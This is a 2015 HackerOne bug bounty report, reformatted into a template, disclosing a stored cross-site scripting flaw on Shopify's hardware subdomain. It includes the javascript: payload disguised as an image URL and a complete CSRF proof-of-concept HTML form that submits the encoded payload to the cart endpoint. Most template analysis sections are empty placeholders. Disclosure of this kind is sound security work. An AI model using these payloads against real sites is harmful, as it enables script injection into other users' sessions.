# Strored Cross Site Scripting

## Metadata
- **Source:** HackerOne
- **Report:** 106636 | https://hackerone.com/reports/106636
- **Submitted:** 2015-12-23
- **Reporter:** hussein98d
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello ,
There is a stored cross site scripting at http://hardware.shopify.com .
I saw that you recently fixed a bug on this sub-domain , so I'm reporting this.


Video Proof of Concept : https://www.youtube.com/watch?v=cP66Bfb0IoE&feature=youtu.be

Payload used : `javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg`

Here is a CSRF PoC also : 


	<html>
    <!-- CSRF PoC -->
  

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello ,
There is a stored cross site scripting at http://hardware.shopify.com .
I saw that you recently fixed a bug on this sub-domain , so I'm reporting this.


Video Proof of Concept : https://www.youtube.com/watch?v=cP66Bfb0IoE&feature=youtu.be

Payload used : `javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg`

Here is a CSRF PoC also : 


	<html>
    <!-- CSRF PoC -->
    <body>
    <form action="http://hardware.shopify.com/cart/add" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="properties&#91;Artwork&#32;file&#93;" value="javascript&#58;alert&#40;&quot;XSS&#32;by&#32;Hussein98d&quot;&#41;&#32;&#47;&#47;http&#58;&#47;&#47;google&#46;com&#47;uploads&#47;powned&#46;jpg" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;1&#93;" value="&#13;" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;2&#93;" value="&#13;" />
    <input type="hidden" name="properties&#91;Custom&#32;text&#32;line&#32;3&#93;" value="&#13;" />
    <input type="hidden" name="production&#45;time" value="standard" />
    <input type="hidden" name="id" value="976094353" />
    <input type="submit" value="Submit request" />
    </form>
	</body>
	</html>


Kind Regards
Hussein

</details>

---
*Analysed by Claude on 2026-05-24*
